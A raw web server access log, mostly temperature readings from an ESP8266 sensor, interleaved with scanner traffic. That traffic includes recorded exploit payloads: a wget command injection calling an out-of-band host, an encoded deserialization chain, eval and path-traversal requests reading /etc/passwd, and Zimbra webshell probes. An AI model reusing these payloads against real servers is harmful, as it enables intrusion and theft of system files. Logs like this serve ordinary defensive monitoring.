20.247.95.171 - - [30/Oct/2022:23:17:43 +0600] "GET /phpmyadmin/index.php HTTP/1.1" 200 2926 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2511.108 Safari/537.36"
20.247.95.171 - - [30/Oct/2022:23:17:43 +0600] "POST /phpmyadmin/index.php HTTP/1.1" 200 2929 "-" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3170.144 Safari/537.36"
20.247.95.171 - - [30/Oct/2022:23:17:43 +0600] "GET /phpmyadmin/index.php HTTP/1.1" 200 2929 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"
20.247.95.171 - - [30/Oct/2022:23:17:44 +0600] "GET /phpmyadmin/index.php HTTP/1.1" 200 2928 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2775.144 Safari/537.36"
20.247.95.171 - - [30/Oct/2022:23:17:44 +0600] "POST /phpmyadmin/index.php HTTP/1.1" 200 2930 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3218.66 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:17:45 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:17:52 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:18:46 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:18:53 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:19:46 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:19:53 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:20:46 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:20:53 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:21:47 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:21:53 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:22:47 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:22:54 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:23:47 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:23:54 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:24:47 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:24:54 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:25:54 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:26:53 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:26:55 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:27:55 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:28:02 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:28:55 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:29:55 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:30:07 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:30:55 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:31:08 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:31:56 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:32:08 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:32:56 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.170 - - [30/Oct/2022:23:33:06 +0600] "GET /cgi-bin/touchlist_sync.cgi?IP=;wget+http://cdf9hhgfbbbvgd000010yid4awe3b5qp6.oast.live; HTTP/1.1" 404 224 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:33:08 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:33:56 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:34:09 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:34:56 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:35:09 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:35:22 +0600] "GET /esp/cms_changeDeviceContext.esp?device=aaaaa:a%27\";user|s.\"1337\"; HTTP/1.1" 404 229 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:35:57 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:36:09 +0600] "GET /tmons/monitor.php?temperature=21.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:36:57 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:37:09 +0600] "GET /tmons/monitor.php?temperature=21.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:37:37 +0600] "GET /index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ== HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:37:57 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:38:08 +0600] "GET /command.cgi?cat%20/etc/passwd HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:38:10 +0600] "GET /tmons/monitor.php?temperature=21.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:38:16 +0600] "POST /xmlrpc HTTP/1.1" 404 204 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:38:57 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:39:10 +0600] "GET /tmons/monitor.php?temperature=21.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:39:37 +0600] "GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1" 404 216 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
192.168.1.30 - - [30/Oct/2022:23:39:58 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:40:13 +0600] "GET /tmons/monitor.php?temperature=21.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:40:58 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:41:13 +0600] "GET /tmons/monitor.php?temperature=21.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:41:58 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:42:12 +0600] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 211 "103.231.135.59/user/register" "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:42:13 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:42:58 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:43:14 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:43:58 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:44:14 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:44:59 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:45:14 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:45:59 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:46:15 +0600] "GET /tmons/monitor.php?temperature=21.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [30/Oct/2022:23:46:53 +0600] "POST /website/blog/ HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36"
118.179.24.168 - - [30/Oct/2022:23:46:56 +0600] "POST /_search HTTP/1.1" 404 205 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:46:59 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:47:02 +0600] "POST /search/ HTTP/1.1" 404 205 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:47:15 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [30/Oct/2022:23:47:38 +0600] "GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 404 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
192.168.1.30 - - [30/Oct/2022:23:47:59 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:48:15 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:49:00 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:49:15 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:50:00 +0600] "GET /tmons/monitor2.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:50:16 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:51:00 +0600] "GET /tmons/monitor2.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:51:16 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:51:44 +0600] "POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1" 404 227 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36"
118.179.24.169 - - [30/Oct/2022:23:51:51 +0600] "POST /ws_utc/resources/setting/options HTTP/1.1" 404 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
118.179.24.170 - - [30/Oct/2022:23:51:53 +0600] "POST /ws_utc/resources/setting/keystore HTTP/1.1" 404 231 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:52:00 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:52:16 +0600] "GET /tmons/monitor.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:52:39 +0600] "GET /index.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:53:01 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:53:16 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:54:01 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.171 - - [30/Oct/2022:23:54:03 +0600] "POST /api/content/ HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
118.179.24.169 - - [30/Oct/2022:23:54:11 +0600] "GET /2GrPlFB54xFLMol0CgBDX0vdjNp.jsp HTTP/1.1" 404 229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:54:17 +0600] "GET /tmons/monitor.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [30/Oct/2022:23:54:54 +0600] "GET /webtools/control/main HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
192.168.1.30 - - [30/Oct/2022:23:55:01 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:55:17 +0600] "GET /tmons/monitor.php?temperature=21.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:56:01 +0600] "GET /tmons/monitor2.php?temperature=21.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:56:17 +0600] "GET /tmons/monitor.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:57:01 +0600] "GET /tmons/monitor2.php?temperature=21.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:57:18 +0600] "GET /tmons/monitor.php?temperature=22.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:58:02 +0600] "GET /tmons/monitor2.php?temperature=21.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:58:18 +0600] "GET /tmons/monitor.php?temperature=23.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:59:02 +0600] "GET /tmons/monitor2.php?temperature=21.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [30/Oct/2022:23:59:18 +0600] "GET /tmons/monitor.php?temperature=23.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:00:02 +0600] "GET /tmons/monitor2.php?temperature=21.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:00:19 +0600] "POST / HTTP/1.1" 200 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:00:19 +0600] "GET /tmons/monitor.php?temperature=23.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:00:20 +0600] "POST / HTTP/1.1" 200 139 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:01:02 +0600] "GET /tmons/monitor2.php?temperature=20.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:01:20 +0600] "GET /tmons/monitor.php?temperature=23.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:02:03 +0600] "GET /tmons/monitor2.php?temperature=20.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:02:20 +0600] "GET /tmons/monitor.php?temperature=23.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:03:03 +0600] "GET /tmons/monitor2.php?temperature=20.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
194.55.186.199 - - [31/Oct/2022:00:03:09 +0600] "POST /boaform/admin/formLogin HTTP/1.1" 404 221 "http://103.231.135.59:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
192.168.1.30 - - [31/Oct/2022:00:03:20 +0600] "GET /tmons/monitor.php?temperature=22.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:04:03 +0600] "GET /tmons/monitor2.php?temperature=20.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:04:21 +0600] "GET /tmons/monitor.php?temperature=22.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:05:03 +0600] "GET /tmons/monitor2.php?temperature=20.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:05:21 +0600] "GET /tmons/monitor.php?temperature=22.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:06:03 +0600] "GET /tmons/monitor2.php?temperature=20.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:06:21 +0600] "GET /tmons/monitor.php?temperature=22.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:07:04 +0600] "GET /tmons/monitor2.php?temperature=20.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:07:21 +0600] "GET /tmons/monitor.php?temperature=22.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:08:03 +0600] "POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1" 404 255 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:08:04 +0600] "GET /tmons/monitor2.php?temperature=20.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:08:22 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.171 - - [31/Oct/2022:00:09:01 +0600] "POST /directdata/direct/router HTTP/1.1" 404 222 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:09:04 +0600] "GET /tmons/monitor2.php?temperature=20.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:09:22 +0600] "GET /tmons/monitor.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:10:04 +0600] "GET /tmons/monitor2.php?temperature=20.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:10:18 +0600] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 226 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:10:22 +0600] "GET /tmons/monitor.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:10:29 +0600] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 226 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:11:05 +0600] "GET /tmons/monitor2.php?temperature=20.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:11:05 +0600] "GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1" 400 226 "-" "-"
118.179.24.169 - - [31/Oct/2022:00:11:08 +0600] "GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1" 400 226 "-" "-"
118.179.24.170 - - [31/Oct/2022:00:11:12 +0600] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 226 "-" "-"
192.168.1.30 - - [31/Oct/2022:00:11:23 +0600] "GET /tmons/monitor.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:12:05 +0600] "GET /tmons/monitor2.php?temperature=20.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:12:23 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [31/Oct/2022:00:12:25 +0600] "POST /service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1 HTTP/1.1" 404 233 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
118.179.24.169 - - [31/Oct/2022:00:12:29 +0600] "GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp HTTP/1.1" 404 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
118.179.24.169 - - [31/Oct/2022:00:12:31 +0600] "POST /service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd HTTP/1.1" 404 233 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
118.179.24.169 - - [31/Oct/2022:00:12:33 +0600] "GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp HTTP/1.1" 404 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
